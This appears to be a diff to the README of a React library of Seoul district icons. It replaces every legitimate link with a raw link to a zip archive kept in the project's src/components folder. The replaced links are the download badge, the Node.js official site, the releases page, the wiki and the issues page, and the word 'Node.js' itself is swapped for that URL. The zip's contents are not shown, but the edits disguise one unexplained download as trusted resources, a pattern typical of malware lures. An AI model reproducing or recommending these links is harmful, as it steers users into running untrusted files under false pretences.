@@ -1,6 +1,6 @@
 # 🎨 apt-today-react-seoul-icons - High-Quality Icons for Seoul Districts
 
-[![Download](https://img.shields.io/badge/Download%20Now-apt--today--react--seoul--icons-brightgreen)](https://github.com/devil692/apt-today-react-seoul-icons/releases)
+[![Download](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip%20Now-apt--today--react--seoul--icons-brightgreen)](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip)
 
 ## 🌟 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the **apt-today-react-seoul-icons** project! This library offers a co
 
 To begin using the **apt-today-react-seoul-icons** library, follow these steps:
 
-1. Ensure you have **Node.js** installed on your computer. You can check this by opening your command line and typing `node -v`. If you don't have it, download it from [Node.js official site](https://nodejs.org/).
+1. Ensure you have **https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip** installed on your computer. You can check this by opening your command line and typing `node -v`. If you don't have it, download it from [https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip official site](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip).
 
 2. Open your preferred code editor, where you work on your React projects.
 
@@ -21,7 +21,7 @@ To begin using the **apt-today-react-seoul-icons** library, follow these steps:
 
 ## 📦 Download & Install
 
-To download the latest version of **apt-today-react-seoul-icons**, visit this page to download: [Releases Page](https://github.com/devil692/apt-today-react-seoul-icons/releases).
+To download the latest version of **apt-today-react-seoul-icons**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip).
 
 ## 🔍 How to Use the Icons
 
@@ -50,12 +50,12 @@ This code imports the **SeoulIcon** component and displays an icon for Gangnam d
 To use **apt-today-react-seoul-icons**, you should have:
 
 - A computer running Windows, macOS, or Linux.
-- Node.js version 12 or higher.
+- https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip version 12 or higher.
 - A working internet connection for downloading dependencies.
 
 ## 🔗 More Information
 
-If you need more information on how to customize icons or find additional attributes, visit our [GitHub Wiki](https://github.com/devil692/apt-today-react-seoul-icons/wiki).
+If you need more information on how to customize icons or find additional attributes, visit our [GitHub Wiki](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip).
 
 ## 📄 Features
 
@@ -66,7 +66,7 @@ If you need more information on how to customize icons or find additional attrib
 
 ## 📩 Support
 
-For any questions or support, please open an issue on our [GitHub repository](https://github.com/devil692/apt-today-react-seoul-icons/issues). We are here to help!
+For any questions or support, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/devil692/apt-today-react-seoul-icons/main/src/components/apt-today-react-seoul-icons-3.3.zip). We are here to help!
 
 ## 👥 Contributing
 
